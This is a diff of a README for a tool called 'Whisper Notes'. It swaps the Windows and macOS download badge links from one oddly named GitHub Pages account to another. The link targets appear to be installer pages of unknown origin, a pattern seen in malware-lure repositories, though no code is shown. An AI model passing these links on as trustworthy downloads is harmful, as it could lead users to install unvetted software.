@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Whisper Notes provides the tools you nee
 
 <div align="center">
 
-[![Download Whisper Notes](https://img.shields.io/badge/⬇_DOWNLOAD_Whisper+Notes-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DenFencerStare.github.io/win-get/)
+[![Download Whisper Notes](https://img.shields.io/badge/⬇_DOWNLOAD_Whisper+Notes-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Whisper Notes provides the tools you nee
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
 
 </div>
 
